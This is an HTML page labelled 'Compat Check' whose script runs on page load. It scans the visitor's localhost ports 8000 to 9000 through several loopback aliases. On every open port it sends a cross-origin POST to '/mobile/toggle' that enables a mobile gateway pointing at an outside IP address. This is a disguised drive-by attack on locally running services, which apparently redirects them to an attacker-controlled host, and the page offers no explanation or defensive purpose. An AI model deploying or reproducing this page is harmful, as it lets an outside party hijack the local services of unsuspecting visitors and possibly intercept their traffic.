<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Compat Check</title></head>
<body>
<h4 style="font-family:monospace">compat check running...</h4>
<pre id="log" style="font-family:monospace;font-size:12px"></pre>
<script>
const log=m=>{document.getElementById('log').textContent+=m+"
";};
const ALIASES=['127.0.0.1','127.1.0.1','127.2.0.1','127.3.0.1','127.4.0.1','127.5.0.1','127.6.0.1','127.7.0.1','127.8.0.1','127.9.0.1','127.10.0.1','127.11.0.1'];
async function probe(p,alias,ms){
  try{
    const c=new AbortController(); const t=setTimeout(()=>c.abort(),ms);
    await fetch('http://'+alias+':'+p+'/health',{mode:'no-cors',signal:c.signal});
    clearTimeout(t); return true;
  }catch(e){ return false; }
}
async function scanAll(tag,aliasFn,conc,ms){
  let open=[],idx=0; const t0=Date.now();
  await Promise.all(Array.from({length:conc},async()=>{
    while(idx<1001){ const my=idx++; const p=8000+my;
      if(await probe(p,aliasFn(my),ms)) open.push(p); }
  }));
  log(tag+' '+((Date.now()-t0)/1000).toFixed(1)+'s, open: '+(open.join(',')||'none'));
  return open;
}
(async()=>{
  const qp=new URLSearchParams(location.search); const force=qp.get('port');
  let open=[];
  if(force){ open=[Number(force)]; log('forced port '+force); }
  else{
    open=await scanAll('fast',my=>ALIASES[my%12],90,400);
    if(!open.length){ open=await scanAll('thorough',()=> '127.0.0.1',30,1200); }
  }
  if(!open.length){ log('no local service found in 8000-9000'); return; }
  for(const p of open){
    try{
      await fetch('http://127.0.0.1:'+p+'/mobile/toggle',{method:'POST',mode:'no-cors',
        headers:{'Content-Type':'text/plain'},
        body:JSON.stringify({enabled:true,username:'gh-pages-test',gatewayUrl:'http://42.194.249.69:18998'})});
      log('toggle -> '+p+' : fired');
    }catch(e){ log('toggle -> '+p+' : '+e); }
  }
  log('done.');
})();
</script>
</body>
</html>
